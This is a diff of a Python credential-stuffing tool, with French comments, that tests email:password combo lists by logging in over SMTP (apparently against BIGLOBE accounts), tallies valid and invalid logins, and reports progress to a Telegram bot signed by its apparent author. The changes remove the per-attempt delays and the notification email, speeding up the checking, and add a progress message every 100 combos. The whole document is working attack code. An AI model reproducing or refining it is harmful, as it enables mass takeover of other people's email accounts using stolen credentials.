@@ -493,32 +493,19 @@ Commandes disponibles :
                 server.starttls(context=context)
                 server.ehlo()
                 server.login(email, password)
-
-                message = (
-                    f"From: {email}\r\n"
-                    f"To: {receiver}\r\n"
-                    f"Subject: +1 BIGLOBE\r\n\r\n"
-                    f"Connexion SMTP réussie : {email}"
-                )
-                server.sendmail(email, receiver, message)
-                server.quit()  # Fermeture propre de la connexion
-            await asyncio.sleep(30)  # Attendre 30 secondes avant la prochaine tentative
-            return True
+                return True
 
         except smtplib.SMTPAuthenticationError:
-            await asyncio.sleep(30)  # Attendre 30 secondes avant la prochaine tentative
             return False
 
         except (smtplib.SMTPServerDisconnected, smtplib.SMTPException) as e:
             with self.print_lock:
                 print(f"[!] Erreur SMTP ({email}): {e}")
-            await asyncio.sleep(30)  # Attendre 30 secondes avant la prochaine tentative
             return False
 
         except Exception as e:
             with self.print_lock:
                 print(f"[!] Erreur inconnue ({email}): {e}")
-            await asyncio.sleep(30)  # Attendre 30 secondes avant la prochaine tentative
             return False
 
     async def send_telegram_message(self, message: str) -> None:
@@ -632,6 +619,24 @@ Commandes disponibles :
                 await self.send_stats()
 
             self.remaining -= 1
+            
+            # Envoi d'un message tous les 100 combos
+            if self.remaining % 100 == 0:
+                progress_message = f"""
+📊 PROGRESSION TOUS LES 100 COMBOS 📊
+━━━━━━━━━━━━━━━━━━━━
+⏱️ Temps écoulé: {int((time.time() - self.start_time)/60)}m {int((time.time() - self.start_time)%60)}s
+📈 Progression: {self.total_combos - self.remaining}/{self.total_combos} ({int(((self.total_combos - self.remaining)/self.total_combos)*100)}%)
+✅ Valides: {len(self.valid_results)}
+❌ Invalides: {self.invalid_count}
+⏳ Timeouts: {self.timeout_count}
+🚀 Vitesse: {(self.total_combos - self.remaining)/(time.time() - self.start_time):.2f} combos/min
+⏳ Temps estimé restant: {int((self.remaining/((self.total_combos - self.remaining)/(time.time() - self.start_time)))/60)}m {int((self.remaining/((self.total_combos - self.remaining)/(time.time() - self.start_time)))%60)}s
+━━━━━━━━━━━━━━━━━━━━
+💻 By @JYMMI10K
+"""
+                await self.send_telegram_message(progress_message)
+            
             await asyncio.sleep(self.DELAY_BETWEEN_CHECKS)
             
             with self.valid_lock:
